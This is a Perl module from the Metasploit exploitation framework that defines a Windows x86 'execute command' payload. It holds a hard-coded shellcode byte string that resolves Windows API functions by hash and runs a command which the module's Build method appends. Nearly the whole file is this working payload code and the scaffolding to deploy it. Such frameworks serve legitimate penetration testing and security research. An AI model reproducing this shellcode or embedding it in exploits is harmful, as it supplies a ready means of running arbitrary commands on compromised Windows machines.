###############
##
#
#    Name: ExecuteCommand.pm
# Version: $Revision$
# License:
#
#      This file is part of the Metasploit Exploit Framework
#      and is subject to the same licenses and copyrights as
#      the rest of this package.
#
# Descrip:
#
#      IA32 execute command for Windows.
#
##
###############

package Msf::PayloadComponent::Windows::ia32::ExecuteCommand;

use strict;
use base 'Msf::PayloadComponent::Windows::Payload';

my $info =
{
	'Authors'     => [ 'vlad902 <vlad902 [at] gmail.com>', ],
	'Arch'        => [ 'x86' ],
	'Priv'        => 0,
	'OS'          => [ 'win32' ],
	'Payload'     =>
		{
			Offsets => 
				{ 
					'EXITFUNC' => [ 120, 'V' ] 
				},
			Payload =>
# XXX: This can be done smaller if instead jump over the string and don't do a
# backwards call at the end
				"\xfc\xe8\x46\x00\x00\x00\x8b\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b".
				"\x4f\x18\x8b\x5f\x20\x01\xeb\xe3\x2e\x49\x8b\x34\x8b\x01\xee\x31".
				"\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54".
				"\x24\x04\x75\xe3\x8b\x5f\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c".
				"\x01\xeb\x8b\x1c\x8b\x01\xeb\x89\x5c\x24\x04\xc3\x31\xc0\x64\x8b".
				"\x40\x30\x85\xc0\x78\x0f\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68\x08".
				"\xe9\x0b\x00\x00\x00\x8b\x40\x34\x05\x7c\x00\x00\x00\x8b\x68\x3c".
				"\x5f\x31\xf6\x60\x56\xeb\x0d\x68\x7e\xd8\xe2\x73\x68\x98\xfe\x8a".
				"\x0e\x57\xff\xe7\xe8\xee\xff\xff\xff",
		},
};

sub new
{
	my $class = shift;
	my $hash  = @_ ? shift : { };
	my $self;

	$hash = $class->MergeHashRec($hash, { Info => $info });
	$self = $class->SUPER::new($hash, @_);

	return $self;
}

#
# Tag the command to execute onto the end of the payload where it's expected
#
sub Build 
{
	my $self = shift;
	my $commandString = $self->CommandString;

	$self->PrintDebugLine(3, "WinExec CMD: $commandString");

	return $self->SUPER::Build . $commandString . "\x00";
}

# This gets overloaded by subclass
sub CommandString 
{
	my $self = shift;
	return '';
}

sub Loadable 
{
	return 1;
}
